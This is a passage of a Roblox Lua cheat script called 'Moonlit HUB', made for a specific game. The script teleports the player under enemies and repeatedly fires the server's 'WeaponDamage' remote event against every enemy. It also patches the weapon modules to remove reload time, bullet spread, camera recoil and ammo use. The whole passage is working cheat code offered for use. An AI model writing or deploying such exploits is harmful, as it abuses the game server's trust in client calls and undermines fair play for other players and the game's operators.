_G.Enabled = value
local C = game.Players.LocalPlayer
local D = C.Character.HumanoidRootPart
local E = C.Character.LowerTorso
while _G.Enabled do
    for F, G in pairs(workspace.Enemies:GetChildren()) do
        if G:FindFirstChild("Humanoid") and G:FindFirstChild("HumanoidRootPart") then
            if G:FindFirstChild("Humanoid") and G:FindFirstChild("HumanoidRootPart") then 
                E.CFrame = G.HumanoidRootPart.CFrame + Vector3.new(0, -17, 0) 
                D.CFrame = G.HumanoidRootPart.CFrame + Vector3.new(0, -17, 0) 
                    end 
                end 
            end
        wait() 
    end 
end)
section1:addToggle('Mob Aura', mouse, function(value)
mouse = game.Players.LocalPlayer:GetMouse(value)
weapon = nil
function GetNearestNPCToMouse()
    local PLAYERS      = {}
    local PLAYER_HOLD  = {}
    local DISTANCES    = {}
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if v ~= game.Players.LocalPlayer then
            table.insert(PLAYERS, v)
        end
    end
    for i, v in pairs(PLAYERS) do
        if v.HumanoidRootPart ~= nil then
            local AIM = v:FindFirstChild("HumanoidRootPart")
            if AIM ~= nil then
                local DISTANCE = (v:FindFirstChild("HumanoidRootPart").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                local DIFF = math.floor((POS - AIM.Position).magnitude)
                PLAYER_HOLD[v.Name .. i] = {}
                PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                PLAYER_HOLD[v.Name .. i].plr = v
                PLAYER_HOLD[v.Name .. i].diff = DIFF
                table.insert(DISTANCES, DIFF)
            end
        end
    end
    
    if unpack(DISTANCES) == nil then
        return nil
    end
    
    local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
    if L_DISTANCE > 20 then
        return nil
    end
    
    for i, v in pairs(PLAYER_HOLD) do
        if v.diff == L_DISTANCE then
            return v.plr
        end
    end
    return nil
end

for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("Model") and v:FindFirstChild("Handle") then
        weapon = v
    end
end
game:GetService('RunService').Stepped:connect(function()
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                game:GetService("ReplicatedStorage").Modules.Network.RemoteEvent:FireServer("WeaponDamage", ""..weapon.Name.."", v.Humanoid)
            end
        end
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                local NPC = GetNearestNPCToMouse()
                game:GetService("ReplicatedStorage").Modules.Network.RemoteEvent:FireServer("WeaponDamage", ""..weapon.Name.."", NPC.Humanoid)
        end
    end
end)
end)
section1:addKeybind("Toggle Keybind", Enum.KeyCode.One, function()
print("Activated Keybind")
venyx:toggle()
end, function()
print("Changed Keybind")
end)

local theme = venyx:addPage("Theme", 5012544693)
local colors = theme:addSection("Colors")
for theme, color in next, themes do
    colors:addColorPicker(theme, color, function(color3)
        venyx:setTheme(theme, color3)
    end)
end
venyx:SelectPage(venyx.pages[1], true)
end

if game.PlaceId == 2029250188 then
	par = game:GetService("CoreGui")
	local playerser = game:GetService("Players")
	local client = playerser.LocalPlayer
	local playergui = client:WaitForChild("PlayerGui")
	playergui:SetTopbarTransparency(1)
	local sg = Instance.new("ScreenGui", par)
	sg.Name = "Moonlit HUB"
	sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	local main = Instance.new("Frame", sg)
	main.Name = "main"
	main.Size = UDim2.new(1,0,1,0)
	main.BackgroundTransparency = 1

	function rainbow(obj)
		spawn(function()
			while true do
				for i = 0,1,0.004 do
					obj.BackgroundColor3 = Color3.fromHSV(i,1,1)
					if obj:IsA"TextLabel" then
						obj.TextColor3 = Color3.fromHSV(i,1,1)
					end
					wait(0.01)
				end
			end
		end)
	end

	local topbar = Instance.new("TextButton", main)
	topbar.Name = "topbar"
	topbar.Size = UDim2.new(1,0,0,40)
	topbar.Position = UDim2.new(0,0,0,-36)
	topbar.BackgroundColor3 = Color3.fromRGB(30,30,30)
	topbar.BorderSizePixel = 0
	topbar.Text = ""
	topbar.ZIndex = 16
	topbar.TextColor3 = Color3.new(1, 1, 1)
	--[[
	topbar.ClipsDescendants = true
	topbar.AutoButtonColor = false
	topbar.MouseEnter:connect(function()
		topbar:TweenSize(UDim2.new(1,0,0,246), "Out", "Quad", 0.2, true)
	end)
	topbar.MouseLeave:connect(function()
		topbar:TweenSize(UDim2.new(1,0,0,36), "In", "Quad", 0.2, true)
	end)
	]]--
	local title = Instance.new("TextLabel", topbar)
	title.Name = "title"
	title.Size = UDim2.new(1,0,0,24)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.Code
	title.TextScaled = true
	rainbow(title)
	local version = Instance.new("TextLabel", topbar)
	version.Name = "version"
	version.Size = UDim2.new(1,0,0,10)
	version.Position = UDim2.new(0,0,0,25)
	version.BackgroundTransparency = 1
	version.TextColor3 = Color3.new(1,1,1)
	version.Font = Enum.Font.Code
	version.TextSize = 14
	local line = Instance.new("Frame", topbar)
	line.Name = "line"
	line.Size = UDim2.new(1,0,0,-1)
	line.Position = UDim2.new(0,0,1,0)
	line.BorderSizePixel = 0
	rainbow(line)
	title.Text = "Moonlit HUB"
	version.Text = "PepePIG#1430"
local rifle = require(game.ReplicatedStorage.Resources.Modules.MachineArm)
local rifleData = require(game.ReplicatedStorage.Resources.Modules.ToolData).MachineArm
local riflez = require(game.ReplicatedStorage.Resources.Modules.SniperRifle)
local rifleDataz = require(game.ReplicatedStorage.Resources.Modules.ToolData).SniperRifle
local riflex = require(game.ReplicatedStorage.Resources.Modules.Rifle)
local rifleDatax = require(game.ReplicatedStorage.Resources.Modules.ToolData).Rifle
local riflec = require(game.ReplicatedStorage.Resources.Modules.Staff)
local rifleDatac = require(game.ReplicatedStorage.Resources.Modules.ToolData).Staff
local riflev = require(game.ReplicatedStorage.Resources.Modules.Revolver)
local rifleDatav = require(game.ReplicatedStorage.Resources.Modules.ToolData).Revolver
local rifleb = require(game.ReplicatedStorage.Resources.Modules.ScrapCannon)
local rifleDatab = require(game.ReplicatedStorage.Resources.Modules.ToolData).ScrapCannon
local riflen = require(game.ReplicatedStorage.Resources.Modules.Flintlocks)
local rifleDatan = require(game.ReplicatedStorage.Resources.Modules.ToolData).Flintlocks
local Constants = require(game.ReplicatedStorage.Resources.Modules.Constants)
local PRIMARY_ATTACK = Constants.AttackTypes.PRIMARY
local SECONDARY_ATTACK = Constants.AttackTypes.SECONDARY
local CameraShakerHelper = require(game.ReplicatedStorage.Resources.Modules.CameraShakerHelper)
CameraShakerHelper.SmallGunShot = function() end -- Remove camera recoil.

local gunData = rifleData[PRIMARY_ATTACK]
gunData.RELOAD_TIME = 0 
local SPREAD = 0

local gunData = rifleDataz[PRIMARY_ATTACK]
gunData.RELOAD_TIME = 0 
local SPREAD = 0

local gunData = rifleDatax[PRIMARY_ATTACK]
gunData.RELOAD_TIME = 0 
local SPREAD = 0

local gunData = rifleDatac[PRIMARY_ATTACK]
gunData.RELOAD_TIME = 0 
local SPREAD = 0

local gunData = rifleDatav[PRIMARY_ATTACK]
gunData.RELOAD_TIME = 0 
local SPREAD = 0

local gunData = rifleDatab[PRIMARY_ATTACK]
gunData.RELOAD_TIME = 0 
local SPREAD = 0

local gunData = rifleDatan[PRIMARY_ATTACK]
gunData.RELOAD_TIME = 0 
local SPREAD = 0

local o = rifle.FireBulletWithError
rifle.FireBulletWithError = function(a, b, c, err, ...)
for i = 1, 1 do
o(a, b, c, err * SPREAD, ...)
end
return o(a, b, c, err * SPREAD, ...)
end
rifle.IfConsumeAmmoThen = function(a, b, c, func)
return func(true)
end
local o = riflez.FireBulletWithError
riflez.FireBulletWithError = function(a, b, c, err, ...)
for i = 1, 1 do
o(a, b, c, err * SPREAD, ...)
end
return o(a, b, c, err * SPREAD, ...)
end
riflez.IfConsumeAmmoThen = function(a, b, c, func)
return func(true)
end
local o = riflex.FireBulletWithError
riflex.FireBulletWithError = function(a, b, c, err, ...)
for i = 1, 1 do
o(a, b, c, err * SPREAD, ...)
end
return o(a, b, c, err * SPREAD, ...)
end
riflex.IfConsumeAmmoThen = function(a, b, c, func)
return func(true)
end
local o = riflec.FireBulletWithError
riflec.FireBulletWithError = function(a, b, c, err, ...)
for i = 1, 1 do
o(a, b, c, err * SPREAD, ...)
end
return o(a, b, c, err * SPREAD, ...)
end
riflec.IfConsumeAmmoThen = function(a, b, c, func)
return func(true)
end
local o = riflev.FireBulletWithError
riflev.FireBulletWithError = function(a, b, c, err, ...)
for i = 1, 1 do
o(a, b, c, err * SPREAD, ...)
end
return o(a, b, c, err * SPREAD, ...)
end
riflev.IfConsumeAmmoThen = function(a, b, c, func)
return func(true)
end
local o = rifleb.FireBulletWithError
rifleb.FireBulletWithError = function(a, b, c, err, ...)
for i = 1, 1 do
o(a, b, c, err * SPREAD, ...)
end
return o(a, b, c, err * SPREAD, ...)
end
rifleb.IfConsumeAmmoThen = function(a, b, c, func)
return func(true)
end
local o = riflen.FireBulletWithError
riflen.FireBulletWithError = function(a, b, c, err, ...)
for i = 1, 1 do
o(a, b, c, err * SPREAD, ...)
end
return o(a, b, c, err * SPREAD, ...)
end
riflen.IfConsumeAmmoThen = function(a, b, c, func)
return func(true)
end
end